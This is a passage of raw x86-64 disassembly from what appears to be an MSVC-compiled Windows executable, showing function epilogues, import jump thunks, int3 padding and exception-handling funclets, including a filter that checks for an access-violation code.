   140007c4b:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140007c4f:	41 56                	push   %r14
   140007c51:	48 83 ec 20          	sub    $0x20,%rsp
   140007c55:	49 8b 59 38          	mov    0x38(%r9),%rbx
   140007c59:	48 8b f2             	mov    %rdx,%rsi
   140007c5c:	4d 8b f0             	mov    %r8,%r14
   140007c5f:	48 8b e9             	mov    %rcx,%rbp
   140007c62:	49 8b d1             	mov    %r9,%rdx
   140007c65:	48 8b ce             	mov    %rsi,%rcx
   140007c68:	49 8b f9             	mov    %r9,%rdi
   140007c6b:	4c 8d 43 04          	lea    0x4(%rbx),%r8
   140007c6f:	e8 ac fe ff ff       	call   0x140007b20
   140007c74:	8b 45 04             	mov    0x4(%rbp),%eax
   140007c77:	24 66                	and    $0x66,%al
   140007c79:	f6 d8                	neg    %al
   140007c7b:	b8 01 00 00 00       	mov    $0x1,%eax
   140007c80:	45 1b c9             	sbb    %r9d,%r9d
   140007c83:	41 f7 d9             	neg    %r9d
   140007c86:	44 03 c8             	add    %eax,%r9d
   140007c89:	44 85 4b 04          	test   %r9d,0x4(%rbx)
   140007c8d:	74 11                	je     0x140007ca0
   140007c8f:	4c 8b cf             	mov    %rdi,%r9
   140007c92:	4d 8b c6             	mov    %r14,%r8
   140007c95:	48 8b d6             	mov    %rsi,%rdx
   140007c98:	48 8b cd             	mov    %rbp,%rcx
   140007c9b:	e8 e0 fe ff ff       	call   0x140007b80
   140007ca0:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140007ca5:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140007caa:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140007caf:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   140007cb4:	48 83 c4 20          	add    $0x20,%rsp
   140007cb8:	41 5e                	pop    %r14
   140007cba:	c3                   	ret
   140007cbb:	ff 25 57 17 00 00    	jmp    *0x1757(%rip)        # 0x140009418
   140007cc1:	ff 25 61 17 00 00    	jmp    *0x1761(%rip)        # 0x140009428
   140007cc7:	cc                   	int3
   140007cc8:	cc                   	int3
   140007cc9:	cc                   	int3
   140007cca:	cc                   	int3
   140007ccb:	cc                   	int3
   140007ccc:	cc                   	int3
   140007ccd:	cc                   	int3
   140007cce:	cc                   	int3
   140007ccf:	cc                   	int3
   140007cd0:	cc                   	int3
   140007cd1:	cc                   	int3
   140007cd2:	cc                   	int3
   140007cd3:	cc                   	int3
   140007cd4:	cc                   	int3
   140007cd5:	cc                   	int3
   140007cd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007cdd:	00 00 00 
   140007ce0:	ff e0                	jmp    *%rax
   140007ce2:	cc                   	int3
   140007ce3:	cc                   	int3
   140007ce4:	cc                   	int3
   140007ce5:	cc                   	int3
   140007ce6:	cc                   	int3
   140007ce7:	cc                   	int3
   140007ce8:	cc                   	int3
   140007ce9:	cc                   	int3
   140007cea:	cc                   	int3
   140007ceb:	cc                   	int3
   140007cec:	cc                   	int3
   140007ced:	cc                   	int3
   140007cee:	cc                   	int3
   140007cef:	cc                   	int3
   140007cf0:	cc                   	int3
   140007cf1:	cc                   	int3
   140007cf2:	cc                   	int3
   140007cf3:	cc                   	int3
   140007cf4:	cc                   	int3
   140007cf5:	cc                   	int3
   140007cf6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140007cfd:	00 00 00 
   140007d00:	ff 25 4a 19 00 00    	jmp    *0x194a(%rip)        # 0x140009650
   140007d06:	cc                   	int3
   140007d07:	cc                   	int3
   140007d08:	cc                   	int3
   140007d09:	cc                   	int3
   140007d0a:	cc                   	int3
   140007d0b:	cc                   	int3
   140007d0c:	cc                   	int3
   140007d0d:	cc                   	int3
   140007d0e:	cc                   	int3
   140007d0f:	cc                   	int3
   140007d10:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140007d17:	e9 84 96 ff ff       	jmp    0x1400013a0
   140007d1c:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007d23:	e9 78 96 ff ff       	jmp    0x1400013a0
   140007d28:	48 8d 8a 20 01 00 00 	lea    0x120(%rdx),%rcx
   140007d2f:	e9 6c 96 ff ff       	jmp    0x1400013a0
   140007d34:	48 8d 8a 00 01 00 00 	lea    0x100(%rdx),%rcx
   140007d3b:	e9 60 96 ff ff       	jmp    0x1400013a0
   140007d40:	40 55                	rex push %rbp
   140007d42:	48 83 ec 20          	sub    $0x20,%rsp
   140007d46:	48 8b ea             	mov    %rdx,%rbp
   140007d49:	ba 18 00 00 00       	mov    $0x18,%edx
   140007d4e:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007d52:	e8 c9 ef ff ff       	call   0x140006d20
   140007d57:	48 83 c4 20          	add    $0x20,%rsp
   140007d5b:	5d                   	pop    %rbp
   140007d5c:	c3                   	ret
   140007d5d:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007d64:	e9 c7 95 ff ff       	jmp    0x140001330
   140007d69:	40 55                	rex push %rbp
   140007d6b:	48 83 ec 20          	sub    $0x20,%rsp
   140007d6f:	48 8b ea             	mov    %rdx,%rbp
   140007d72:	ba 18 00 00 00       	mov    $0x18,%edx
   140007d77:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007d7b:	e8 a0 ef ff ff       	call   0x140006d20
   140007d80:	48 83 c4 20          	add    $0x20,%rsp
   140007d84:	5d                   	pop    %rbp
   140007d85:	c3                   	ret
   140007d86:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007d8d:	e9 9e 95 ff ff       	jmp    0x140001330
   140007d92:	40 55                	rex push %rbp
   140007d94:	48 83 ec 20          	sub    $0x20,%rsp
   140007d98:	48 8b ea             	mov    %rdx,%rbp
   140007d9b:	ba 18 00 00 00       	mov    $0x18,%edx
   140007da0:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007da4:	e8 77 ef ff ff       	call   0x140006d20
   140007da9:	48 83 c4 20          	add    $0x20,%rsp
   140007dad:	5d                   	pop    %rbp
   140007dae:	c3                   	ret
   140007daf:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007db6:	e9 75 95 ff ff       	jmp    0x140001330
   140007dbb:	40 55                	rex push %rbp
   140007dbd:	48 83 ec 20          	sub    $0x20,%rsp
   140007dc1:	48 8b ea             	mov    %rdx,%rbp
   140007dc4:	ba 18 00 00 00       	mov    $0x18,%edx
   140007dc9:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007dcd:	e8 4e ef ff ff       	call   0x140006d20
   140007dd2:	48 83 c4 20          	add    $0x20,%rsp
   140007dd6:	5d                   	pop    %rbp
   140007dd7:	c3                   	ret
   140007dd8:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007ddf:	e9 4c 95 ff ff       	jmp    0x140001330
   140007de4:	40 55                	rex push %rbp
   140007de6:	48 83 ec 20          	sub    $0x20,%rsp
   140007dea:	48 8b ea             	mov    %rdx,%rbp
   140007ded:	ba 18 00 00 00       	mov    $0x18,%edx
   140007df2:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007df6:	e8 25 ef ff ff       	call   0x140006d20
   140007dfb:	48 83 c4 20          	add    $0x20,%rsp
   140007dff:	5d                   	pop    %rbp
   140007e00:	c3                   	ret
   140007e01:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007e08:	e9 23 95 ff ff       	jmp    0x140001330
   140007e0d:	48 8d 8a 70 00 00 00 	lea    0x70(%rdx),%rcx
   140007e14:	e9 87 95 ff ff       	jmp    0x1400013a0
   140007e19:	48 8d 8a 90 00 00 00 	lea    0x90(%rdx),%rcx
   140007e20:	e9 7b 95 ff ff       	jmp    0x1400013a0
   140007e25:	48 8d 8a a8 00 00 00 	lea    0xa8(%rdx),%rcx
   140007e2c:	e9 6f 95 ff ff       	jmp    0x1400013a0
   140007e31:	40 55                	rex push %rbp
   140007e33:	48 83 ec 20          	sub    $0x20,%rsp
   140007e37:	48 8b ea             	mov    %rdx,%rbp
   140007e3a:	ba 18 00 00 00       	mov    $0x18,%edx
   140007e3f:	48 8b 4d 50          	mov    0x50(%rbp),%rcx
   140007e43:	e8 d8 ee ff ff       	call   0x140006d20
   140007e48:	48 83 c4 20          	add    $0x20,%rsp
   140007e4c:	5d                   	pop    %rbp
   140007e4d:	c3                   	ret
   140007e4e:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007e55:	e9 d6 94 ff ff       	jmp    0x140001330
   140007e5a:	cc                   	int3
   140007e5b:	cc                   	int3
   140007e5c:	cc                   	int3
   140007e5d:	cc                   	int3
   140007e5e:	cc                   	int3
   140007e5f:	cc                   	int3
   140007e60:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007e67:	e9 94 cf ff ff       	jmp    0x140004e00
   140007e6c:	cc                   	int3
   140007e6d:	cc                   	int3
   140007e6e:	cc                   	int3
   140007e6f:	cc                   	int3
   140007e70:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007e77:	e9 14 cf ff ff       	jmp    0x140004d90
   140007e7c:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007e83:	e9 88 b7 ff ff       	jmp    0x140003610
   140007e88:	cc                   	int3
   140007e89:	cc                   	int3
   140007e8a:	cc                   	int3
   140007e8b:	cc                   	int3
   140007e8c:	cc                   	int3
   140007e8d:	cc                   	int3
   140007e8e:	cc                   	int3
   140007e8f:	cc                   	int3
   140007e90:	48 8d 8a 80 00 00 00 	lea    0x80(%rdx),%rcx
   140007e97:	e9 74 b7 ff ff       	jmp    0x140003610
   140007e9c:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140007ea3:	e9 d8 cf ff ff       	jmp    0x140004e80
   140007ea8:	cc                   	int3
   140007ea9:	cc                   	int3
   140007eaa:	cc                   	int3
   140007eab:	cc                   	int3
   140007eac:	cc                   	int3
   140007ead:	cc                   	int3
   140007eae:	cc                   	int3
   140007eaf:	cc                   	int3
   140007eb0:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140007eb7:	e9 d4 e8 ff ff       	jmp    0x140006790
   140007ebc:	48 8d 8a 20 00 00 00 	lea    0x20(%rdx),%rcx
   140007ec3:	e9 58 e3 ff ff       	jmp    0x140006220
   140007ec8:	48 89 54 24 10       	mov    %rdx,0x10(%rsp)
   140007ecd:	55                   	push   %rbp
   140007ece:	48 83 ec 20          	sub    $0x20,%rsp
   140007ed2:	48 8b ea             	mov    %rdx,%rbp
   140007ed5:	48 8b 55 50          	mov    0x50(%rbp),%rdx
   140007ed9:	48 8b 02             	mov    (%rdx),%rax
   140007edc:	48 63 48 04          	movslq 0x4(%rax),%rcx
   140007ee0:	48 03 ca             	add    %rdx,%rcx
   140007ee3:	41 b0 01             	mov    $0x1,%r8b
   140007ee6:	ba 04 00 00 00       	mov    $0x4,%edx
   140007eeb:	ff 15 57 13 00 00    	call   *0x1357(%rip)        # 0x140009248
   140007ef1:	90                   	nop
   140007ef2:	48 b8 00 00 00 00 00 	movabs $0x0,%rax
   140007ef9:	00 00 00 
   140007efc:	48 83 c4 20          	add    $0x20,%rsp
   140007f00:	5d                   	pop    %rbp
   140007f01:	c3                   	ret
   140007f02:	cc                   	int3
   140007f03:	cc                   	int3
   140007f04:	cc                   	int3
   140007f05:	cc                   	int3
   140007f06:	cc                   	int3
   140007f07:	cc                   	int3
   140007f08:	cc                   	int3
   140007f09:	cc                   	int3
   140007f0a:	cc                   	int3
   140007f0b:	cc                   	int3
   140007f0c:	cc                   	int3
   140007f0d:	cc                   	int3
   140007f0e:	cc                   	int3
   140007f0f:	cc                   	int3
   140007f10:	40 55                	rex push %rbp
   140007f12:	48 83 ec 20          	sub    $0x20,%rsp
   140007f16:	48 8b ea             	mov    %rdx,%rbp
   140007f19:	8b 45 20             	mov    0x20(%rbp),%eax
   140007f1c:	83 e0 01             	and    $0x1,%eax
   140007f1f:	85 c0                	test   %eax,%eax
   140007f21:	74 15                	je     0x140007f38
   140007f23:	83 65 20 fe          	andl   $0xfffffffe,0x20(%rbp)
   140007f27:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   140007f2b:	48 81 c1 a8 00 00 00 	add    $0xa8,%rcx
   140007f32:	ff 15 40 12 00 00    	call   *0x1240(%rip)        # 0x140009178
   140007f38:	48 83 c4 20          	add    $0x20,%rsp
   140007f3c:	5d                   	pop    %rbp
   140007f3d:	c3                   	ret
   140007f3e:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140007f45:	48 83 c1 10          	add    $0x10,%rcx
   140007f49:	48 ff 25 00 12 00 00 	rex.W jmp *0x1200(%rip)        # 0x140009150
   140007f50:	48 8b 8a 30 00 00 00 	mov    0x30(%rdx),%rcx
   140007f57:	48 83 c1 08          	add    $0x8,%rcx
   140007f5b:	e9 a0 dd ff ff       	jmp    0x140005d00
   140007f60:	48 8d 8a 50 00 00 00 	lea    0x50(%rdx),%rcx
   140007f67:	e9 64 94 ff ff       	jmp    0x1400013d0
   140007f6c:	cc                   	int3
   140007f6d:	cc                   	int3
   140007f6e:	cc                   	int3
   140007f6f:	cc                   	int3
   140007f70:	48 8d 8a 58 00 00 00 	lea    0x58(%rdx),%rcx
   140007f77:	e9 04 cf ff ff       	jmp    0x140004e80
   140007f7c:	cc                   	int3
   140007f7d:	cc                   	int3
   140007f7e:	cc                   	int3
   140007f7f:	cc                   	int3
   140007f80:	48 8d 8a 28 00 00 00 	lea    0x28(%rdx),%rcx
   140007f87:	48 ff 25 12 12 00 00 	rex.W jmp *0x1212(%rip)        # 0x1400091a0
   140007f8e:	48 8d 8a 30 00 00 00 	lea    0x30(%rdx),%rcx
   140007f95:	e9 c6 e2 ff ff       	jmp    0x140006260
   140007f9a:	40 55                	rex push %rbp
   140007f9c:	48 83 ec 20          	sub    $0x20,%rsp
   140007fa0:	48 8b ea             	mov    %rdx,%rbp
   140007fa3:	48 8b d1             	mov    %rcx,%rdx
   140007fa6:	48 8b 09             	mov    (%rcx),%rcx
   140007fa9:	8b 09                	mov    (%rcx),%ecx
   140007fab:	e8 12 fc ff ff       	call   0x140007bc2
   140007fb0:	90                   	nop
   140007fb1:	48 83 c4 20          	add    $0x20,%rsp
   140007fb5:	5d                   	pop    %rbp
   140007fb6:	c3                   	ret
   140007fb7:	cc                   	int3
   140007fb8:	40 55                	rex push %rbp
   140007fba:	48 8b ea             	mov    %rdx,%rbp
   140007fbd:	48 8b 01             	mov    (%rcx),%rax
   140007fc0:	33 c9                	xor    %ecx,%ecx
   140007fc2:	81 38 05 00 00 c0    	cmpl   $0xc0000005,(%rax)
   140007fc8:	0f 94 c1             	sete   %cl
   140007fcb:	8b c1                	mov    %ecx,%eax
   140007fcd:	5d                   	pop    %rbp
   140007fce:	c3                   	ret
   140007fcf:	cc                   	int3
   140007fd0:	40 53                	rex push %rbx
   140007fd2:	48 83 ec 20          	sub    $0x20,%rsp
   140007fd6:	eb 3d                	jmp    0x140008015
   140007fd8:	48 8b 03             	mov    (%rbx),%rax
   140007fdb:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140007fdf:	48 89 05 9a 63 00 00 	mov    %rax,0x639a(%rip)        # 0x14000e380
   140007fe6:	48 8b 01             	mov    (%rcx),%rax
   140007fe9:	48 8b 40 10          	mov    0x10(%rax),%rax
   140007fed:	ff 15 5d 16 00 00    	call   *0x165d(%rip)        # 0x140009650
   140007ff3:	48 8b c8             	mov    %rax,%rcx
   140007ff6:	48 85 c0             	test   %rax,%rax
   140007ff9:	74 11                	je     0x14000800c
   140007ffb:	48 8b 10             	mov    (%rax),%rdx
   140007ffe:	48 8b 02             	mov    (%rdx),%rax
   140008001:	ba 01 00 00 00       	mov    $0x1,%edx
   140008006:	ff 15 44 16 00 00    	call   *0x1644(%rip)        # 0x140009650
   14000800c:	48 8b cb             	mov    %rbx,%rcx
   14000800f:	ff 15 63 14 00 00    	call   *0x1463(%rip)        # 0x140009478
   140008015:	48 8b 1d 64 63 00 00 	mov    0x6364(%rip),%rbx        # 0x14000e380
   14000801c:	48 85 db             	test   %rbx,%rbx
   14000801f:	75 b7                	jne    0x140007fd8
   140008021:	48 83 c4 20          	add    $0x20,%rsp
   140008025:	5b                   	pop    %rbx
   140008026:	c3                   	ret
